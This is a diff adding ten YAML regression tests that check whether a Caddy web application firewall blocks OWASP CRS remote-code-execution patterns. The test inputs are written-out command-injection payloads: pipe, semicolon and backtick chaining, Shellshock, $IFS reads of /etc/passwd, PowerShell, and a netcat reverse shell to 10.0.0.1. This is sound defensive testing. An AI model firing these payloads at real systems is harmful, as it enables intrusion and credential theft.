@@ -1,0 +1,181 @@
+---
+meta:
+  author: "Developmi"
+  description: "CRS 4.29.0 Family 932 - Remote Code Execution (RCE)"
+  enabled: true
+  name: "crs-932-attack-rce"
+
+rule_id: 932000
+
+tests:
+  - test_title: "Unix command chaining pipe - WAF should block"
+    test_id: 1
+    description: "CRS rule 932100. Pipe command chaining | id triggers 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/?input=foo|id"
+            method: "GET"
+            headers:
+              User-Agent: "caddy-waf-test/1.0"
+              Host: "localhost"
+          output:
+            status: [403]
+
+  - test_title: "Unix command chaining semicolon - WAF should block"
+    test_id: 2
+    description: "CRS rule 932100/932150. Semicolon chaining ; /bin/sh triggers 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/?arg=test;/bin/sh"
+            method: "GET"
+            headers:
+              User-Agent: "caddy-waf-test/1.0"
+              Host: "localhost"
+          output:
+            status: [403]
+
+  - test_title: "Backtick command substitution - WAF should block"
+    test_id: 3
+    description: "CRS rule 932160. Backtick command execution triggers 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/?cmd=`cat%20/etc/passwd`"
+            method: "GET"
+            headers:
+              User-Agent: "caddy-waf-test/1.0"
+              Host: "localhost"
+          output:
+            status: [403]
+
+  - test_title: "Subshell execution $(whoami) - WAF should block"
+    test_id: 4
+    description: "CRS rule 932130. Unix subshell expression $(whoami) triggers 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/?search=$(whoami)"
+            method: "GET"
+            headers:
+              User-Agent: "caddy-waf-test/1.0"
+              Host: "localhost"
+          output:
+            status: [403]
+
+  - test_title: "Windows command injection - WAF should block"
+    test_id: 5
+    description: "CRS rule 932110. Windows command chaining & dir triggers 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/?file=report.txt&dir"
+            method: "GET"
+            headers:
+              User-Agent: "caddy-waf-test/1.0"
+              Host: "localhost"
+          output:
+            status: [403]
+
+  - test_title: "PowerShell command execution - WAF should block"
+    test_id: 6
+    description: "CRS rule 932120. PowerShell command invocation triggers 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/?exec=powershell.exe%20-Command%20Get-Process"
+            method: "GET"
+            headers:
+              User-Agent: "caddy-waf-test/1.0"
+              Host: "localhost"
+          output:
+            status: [403]
+
+  - test_title: "Shellshock in User-Agent - WAF should block"
+    test_id: 7
+    description: "CRS rule 932170. Shellshock CVE-2014-6271 pattern in headers triggers 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/"
+            method: "GET"
+            headers:
+              User-Agent: "() { :;}; /bin/cat /etc/passwd"
+              Host: "localhost"
+          output:
+            status: [403]
+
+  - test_title: "Reverse shell netcat execution - WAF should block"
+    test_id: 8
+    description: "CRS rule 932100/932150. Netcat reverse shell syntax triggers 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/?run=nc+-e+/bin/sh+10.0.0.1+4444"
+            method: "GET"
+            headers:
+              User-Agent: "caddy-waf-test/1.0"
+              Host: "localhost"
+          output:
+            status: [403]
+
+  - test_title: "Unix command in POST body - WAF should block"
+    test_id: 9
+    description: "CRS rule 932100. Unix uname -a in POST body triggers 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/post"
+            method: "POST"
+            headers:
+              User-Agent: "caddy-waf-test/1.0"
+              Host: "localhost"
+              Content-Type: "application/x-www-form-urlencoded"
+            data: "cmd=;+uname+-a"
+          output:
+            status: [403]
+
+  - test_title: "Shell IFS variable bypass - WAF should block"
+    test_id: 10
+    description: "CRS rule 932130. Command with $IFS substitution triggers 403."
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            port: 9090
+            protocol: "http"
+            uri: "/?run=cat$IFS/etc/passwd"
+            method: "GET"
+            headers:
+              User-Agent: "caddy-waf-test/1.0"
+              Host: "localhost"
+          output:
+            status: [403]
